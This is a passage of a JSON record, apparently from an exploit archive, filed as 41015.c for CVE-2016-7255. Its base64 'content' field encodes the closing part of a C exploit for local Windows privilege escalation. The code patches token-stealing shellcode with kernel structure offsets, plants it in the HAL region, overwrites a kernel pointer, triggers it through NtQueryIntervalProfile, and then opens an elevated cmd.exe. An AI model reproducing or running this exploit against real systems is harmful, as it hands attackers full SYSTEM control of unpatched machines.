jaCBzaGVsbGNvZGUxDQoNCglwICs9IDEyOyAvLyBQYXRjaCBzaGVsbGNvZGUgd2l0aCBvcmlnaW5hbCB2YWx1ZSBpbiB0aGUgT3ZlcndyaXRlIGFkZHJlc3MNCgkqKFBWT0lEICopcCA9IChQVk9JRCkob3ZlcndyaXRlX2FkZHJlc3MgKyBvdmVyd3JpdGVfb2Zmc2V0KTsNCg0KCXAgKz0gMTI7IC8vIFRvIHBhdGNoIHRoZSBQSUQgb2Ygb3VyIHByb2Nlc3MNCgkNCgkqKERXT1JEICopcCA9IChEV09SRClwaWQ7DQogICAgDQogICAgcCArPSAxNzsNCiAgICAqKHVuc2lnbmVkIGNoYXIgKilwID0gKHVuc2lnbmVkIGNoYXIpc2NfS1BST0NFU1M7DQogICAgDQogICAgcCArPSA3Ow0KICAgICoodW5zaWduZWQgaW50ICopcCA9ICh1bnNpZ25lZCBpbnQpc2NfQVBMSU5LUzsNCiAgICANCiAgICBwICs9IDIwOw0KICAgICoodW5zaWduZWQgaW50ICopcCA9ICh1bnNpZ25lZCBpbnQpc2NfVE9LRU47DQogICAgDQogICAgcCArPSAyMDsNCiAgICAqKHVuc2lnbmVkIGludCAqKXAgPSAodW5zaWduZWQgaW50KXNjX1RPS0VOOw0KICAgIA0KICAgIFVJTlQ2NCBzaGVsbGNvZGVfdmEgPSBzdG9yZV9zaGVsbGNvZGVfaW5faGFsKCk7DQoJcHJpbnRmKCJbK10gdzAwdDogU2hlbGxjb2RlIHN0b3JlZCBhdDogJWxseFxuIiwgc2hlbGxjb2RlX3ZhKTsNCglvdmVyd3JpdGVfVGFyZ2V0QWRkcmVzcyhzaGVsbGNvZGVfdmEsIG92ZXJ3cml0ZV9hZGRyZXNzLCBvdmVyd3JpdGVfb2Zmc2V0KTsNCgkNCglpZiAob3N2ZXJzaW9uID09IDcpew0KCQkvLyBFeHBsb2l0IFdpbjcuMQ0KCQloTnREbGwgPSBMb2FkTGlicmFyeSgibnRkbGwuZGxsIik7DQoNCgkJaWYgKCFoTnREbGwpIHsNCgkJCXByaW50ZigiXHRcdFstXSBGYWlsZWQgbG9hZGluZyBOdERsbDogMHglWFxuIiwgR2V0TGFzdEVycm9yKCkpOw0KCQkJZXhpdChFWElUX0ZBSUxVUkUpOw0KCQl9DQoJDQoJCU50UXVlcnlJbnRlcnZhbFByb2ZpbGUgPSAoTnRRdWVyeUludGVydmFsUHJvZmlsZV90KUdldFByb2NBZGRyZXNzKGhOdERsbCwgIk50UXVlcnlJbnRlcnZhbFByb2ZpbGUiKTsNCg0KCQlpZiAoIU50UXVlcnlJbnRlcnZhbFByb2ZpbGUpIHsNCgkJCXByaW50ZigiXHRcdFstXSBGYWlsZWQgUmVzb2x2aW5nIE50UXVlcnlJbnRlcnZhbFByb2ZpbGU6IDB4JVhcbiIsIEdldExhc3RFcnJvcigpKTsNCgkJCWV4aXQoRVhJVF9GQUlMVVJFKTsNCgkJfQkNCgkJTnRRdWVyeUludGVydmFsUHJvZmlsZSgweDEzMzcsICZJbnRlcnZhbCk7DQoJfQ0KDQoJDQoJd2hpbGUgKDEpIHsNCgkJc2l6ZSA9IDI1NjsNCgkJR2V0VXNlck5hbWUocG9zdF91c2VybmFtZSwgJnNpemUpOw0KCQlpZiAobWVtY21wKHBvc3RfdXNlcm5hbWUsIHByZV91c2VybmFtZSwgMjU2KSAhPSAwKSBicmVhazsNCgl9DQoJU2xlZXAoMjAwMCk7DQoJc3lzdGVtKCJjbWQuZXhlIik7DQoNCg0KCXJldHVybiAwOw0KfQ==", 
    "filename": "platforms/windows/local/41015.c", 
    "id": "41015", 
    "cves": [
        "CVE-2016-7255"
    ]
}